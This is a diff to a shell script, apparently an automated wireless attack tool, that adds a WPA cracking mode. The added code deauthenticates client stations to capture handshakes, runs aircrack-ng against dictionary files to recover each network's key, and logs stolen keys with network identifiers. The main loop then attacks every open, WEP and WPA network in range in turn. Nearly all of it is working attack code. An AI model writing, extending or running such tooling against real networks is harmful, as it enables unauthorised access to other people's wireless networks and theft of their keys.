@@ -80,7 +80,7 @@ else
 	H_RUN_D=$H_MY_D/hostile-run.d
 fi
 
-H_OP_MODES="ap,sta,wep_attack,wep_bruteforce"
+H_OP_MODES="ap,sta,wep_attack,wep_bruteforce,wpa_bruteforce"
 
 H_CAPTURE_IV_ONLY=1
 H_CRACK_TIME_LIMIT=900
@@ -248,6 +248,9 @@ h_startup() {
 	H_WEP_F=$H_RUN_D/hostile-wep.txt
 	touch $H_WEP_F >/dev/null 2>&1 \
 		|| h_error "can't create wep key file '$H_WEP_F'"
+	H_WPA_F=$H_RUN_D/hostile-wpa.txt
+	touch $H_WPA_F >/dev/null 2>&1 \
+		|| h_error "can't create wpa key file '$H_WPA_F'"
 	H_TMP_D=$(mktemp -d $H_RUN_D/hostile-XXXXXX) \
 		|| h_error "can't create tmp directory in '$H_RUN_D'"
 	cd $H_TMP_D >/dev/null 2>&1 \
@@ -688,6 +691,7 @@ h_wep_bruteforce_try() {
 			h_log "found a client station: $client"
 			h_auth_start h_wep_deauth -c $client
 		done
+		sleep 1
 	else
 		h_log "no client station found"
 	fi
@@ -922,12 +926,141 @@ h_wep_try_all_networks() {
 }
 
 
+#
+# handle WPA networks
+#
+
+h_wpa_dict_crack() {
+	local cmd
+	local dictfile
+	dictfile=$1
+	cmd="aircrack-ng -w $dictfile -a 2 -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
+	h_log "running: $cmd"
+	$cmd 2>&1 >/dev/null
+}
+
+h_wpa_wait_for_hs() {
+	h_log "waiting for WPA handshake"
+	sleep $H_REFRESH_DELAY
+	return 0
+}
+
+h_wpa_key_found() {
+	grep -q "^$H_CUR_BSSID," $H_WPA_F 2>/dev/null
+}
+
+h_wpa_key_log() {
+	local key
+	key=$(cat $H_CUR_KEY_F)
+	h_log "key found: $key"
+	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WPA_F
+	H_WPA_CHANNEL=$H_CUR_CHANNEL
+}
+
+h_wpa_bruteforce_try() {
+	local clients
+	local country
+	local dicts
+	local words
+	local RC=1
+
+	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
+	if [ -n "$clients" ]; then
+		for client in $clients; do
+			h_log "found a client station: $client"
+			h_auth_start h_wep_deauth -c $client
+		done
+		sleep 1
+	else
+		h_log "no client station found"
+	fi
+
+	#country=$(get_country_from_ssid $H_CUR_ESSID)
+	country="fr"	
+	if h_wpa_wait_for_hs; then
+		h_log "BF can start \o/ :)"
+		dicts=${H_LIB_D}/dict/${country}-wpa-???.dict
+		for dict in $dicts; do
+			[ -f $dict ] || continue
+			words=$(wc -l $dict)
+			h_log "trying dict '$dict' ($words words)"
+			h_wpa_dict_crack $dict
+			if [ -f $H_CUR_KEY_F ]; then
+				h_hook_call_handlers on_wpa_key_found
+				h_wpa_key_log
+				RC=0
+				break
+			fi
+		done
+	fi
+	if [ $RC -gt 0 ]; then
+		h_log "BF failed"
+	fi
+
+	h_auth_stop
+
+	return $RC
+}
+
+h_wpa_bruteforce() {
+	local capture_options
+	h_wpa_key_found && return
+
+	h_log "trying WPA bruteforce mode"
+
+	h_hook_call_handlers on_wpa_bruteforce_started
+	
+	h_hw_prepare
+	
+	H_CUR_CAP_FEXT="cap"
+	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL --output-format=pcap,csv
+
+	sleep $H_MONITOR_TIME_LIMIT
+
+	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
+	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
+	
+	h_wpa_bruteforce_try
+
+	h_capture_stop
+
+	h_hook_call_handlers on_wpa_bruteforce_ended
+}
+
+h_wpa_try_one_network() {
+	local N
+
+	N=$1
+	H_CUR_BSSID=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
+	H_CUR_CHANNEL=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
+	H_CUR_ESSID=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
+	H_CUR_RATE=$(h_kis_get_network_max_rate $H_ALLKIS_F $N)
+	H_CUR_BASE_FNAME=$(h_get_sane_fname $H_CUR_BSSID)
+
+	if h_wpa_key_found; then
+		h_log "skipping known WPA network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
+		return 0
+	fi
+
+	h_log "trying WPA network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
+
+	[ "$H_OP_MODE_wpa_bruteforce" = "1" ] && h_wpa_bruteforce
+}
+
+h_wpa_try_all_networks() {
+	for N in $(cat $H_NET_WPA_F); do
+		h_wpa_try_one_network $N
+	done
+}
+
+
 h_get_options $@
 h_startup
 while [ 1 ]; do
 	h_monitor_all
 	h_open_try_all_networks
 	h_wep_try_all_networks
+	h_wpa_try_all_networks
 	sleep 1
 done
 h_cleanup
